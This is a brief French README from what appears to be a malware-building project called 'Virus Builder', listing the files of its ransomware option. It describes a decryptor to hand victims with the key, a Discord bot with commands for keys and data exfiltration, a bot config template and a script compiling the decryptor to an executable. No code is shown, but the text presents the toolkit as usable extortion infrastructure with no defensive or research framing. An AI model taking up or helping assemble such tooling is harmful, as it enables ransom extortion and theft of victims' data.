# BLX Ransomware – Déchiffreur et Bot

Ce dossier contient les outils de l’option **Ransomware** du Virus Builder.

- **BLX_Decryptor.py** : déchiffreur .blx (à donner à la victime avec la clé).
- **BLX_Ransomware_Bot.py** : bot Discord (!key, !keys, !exfil, !info, !decryptor).
- **BLX_ransomware_bot_config.example.json** : exemple de config du bot (copier en `BLX_ransomware_bot_config.json`).
- **build_decryptor_exe.bat** : compile BLX_Decryptor en EXE.

**Documentation complète** (structure, options, config Ransomware, déchiffreur, bot, commandes, dépendances) : voir le **README principal** à la racine du projet : **`../README.md`**.
